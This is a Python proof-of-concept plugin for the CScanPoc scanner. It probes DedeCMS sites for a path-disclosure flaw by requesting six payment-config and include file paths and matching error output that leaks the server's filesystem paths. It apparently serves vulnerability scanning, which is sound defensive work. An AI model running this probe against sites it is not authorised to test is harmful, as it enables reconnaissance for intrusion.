# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'dedCMS_0001' # 平台漏洞编号，留空
    name = 'dedCMS 路径泄漏'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'dedCMS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6379d82c-06d9-409a-8f47-972ef133b738'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payloads = [
                '/member/inc/config_pay_yeepay.php', 
                '/member/inc/config_pay_tenpay.php',
                '/member/inc/config_pay_nps.php ',
                '/member/inc/config_pay_cbpayment.php ',
                '/member/inc/config_pay_alipay.php',
                '/include/downmix.inc.php'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                r = requests.get(verify_url)
                
                if r.status_code == 200 and re.search('in <b>([^<]+)</b>', r.text):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
